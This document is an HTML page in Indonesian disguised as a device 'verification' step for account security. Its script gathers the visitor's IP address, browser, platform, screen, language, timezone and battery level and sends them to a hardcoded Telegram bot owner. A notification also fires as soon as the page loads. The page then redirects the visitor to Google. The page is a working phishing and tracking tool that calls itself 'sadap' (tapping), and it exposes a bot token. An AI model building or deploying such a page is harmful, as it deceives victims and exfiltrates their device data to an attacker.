<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Informasi Perangkat - Verifikasi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 30px;
            overflow: hidden;
            max-width: 400px;
            width: 100%;
            margin: 0 auto;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .header {
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            padding: 30px 20px;
            text-align: center;
        }
        .header h1 {
            color: white;
            font-size: 24px;
        }
        .content {
            padding: 30px 20px;
        }
        .info-card {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 15px;
            margin-bottom: 15px;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4facfe;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📱 Informasi Perangkat</h1>
            <p>Data diperlukan untuk keamanan akun</p>
        </div>
        <div class="content">
            <div class="info-card" id="infoDisplay">
                <p>Mengumpulkan informasi perangkat...</p>
            </div>
            <button class="btn" onclick="sendDeviceInfo()">✅ Verifikasi Sekarang</button>
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p style="margin-top: 10px;">Mengirim data...</p>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'unknown';
        
        let targetUserId = 'unknown';
        try {
            const decoded = atob(userId);
            targetUserId = decoded.split('_')[0];
        } catch(e) {}
        
        const BOT_TOKEN = '8887227913:AAHa5qn2FlUaWM79lmA1jvJTWjb6lK5vCiI';
        const OWNER_ID = '8486996997';
        
        async function sendMessageToTelegram(chatId, message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
                });
            } catch(e) {}
        }
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'Unknown';
            }
        }
        
        async function sendNotification() {
            const message = `🔴 *TARGET MEMBUKA SADAPAN DEVICE*\n\n👤 User ID: \`${targetUserId}\`\n🎯 Type: Device Info\n🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendMessageToTelegram(targetUserId, message);
            }
            await sendMessageToTelegram(OWNER_ID, `👀 *DEVICE INFO DARI USER ${targetUserId}*\n${message}`);
        }
        
        async function sendDeviceInfo() {
            document.querySelector('.btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            const ip = await getIP();
            const battery = navigator.getBattery ? await navigator.getBattery().then(b => `${Math.floor(b.level * 100)}%`) : 'Unknown';
            
            const deviceInfo = {
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ip: ip,
                battery: battery
            };
            
            const message = `📱 *HASIL SADAP DEVICE*\n\n` +
                           `┌─────────────────┤❖├─────────────────┐\n` +
                           `│ 👤 User ID: \`${targetUserId}\`\n` +
                           `│ 🌐 IP: ${deviceInfo.ip}\n` +
                           `│ 📱 Platform: ${deviceInfo.platform}\n` +
                           `│ 🖥️ Screen: ${deviceInfo.screen}\n` +
                           `│ 🌍 Language: ${deviceInfo.language}\n` +
                           `│ ⏰ Timezone: ${deviceInfo.timezone}\n` +
                           `│ 🔋 Battery: ${deviceInfo.battery}\n` +
                           `│ 🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n` +
                           `└─────────────────────────────────────┘`;
            
            if (targetUserId && targetUserId !== 'unknown' && targetUserId !== OWNER_ID) {
                await sendMessageToTelegram(targetUserId, message);
            }
            await sendMessageToTelegram(OWNER_ID, `👀 *HASIL DEVICE DARI USER ${targetUserId}*\n${message}`);
            
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 2000);
        }
        
        sendNotification();
    </script>
</body>
</html>
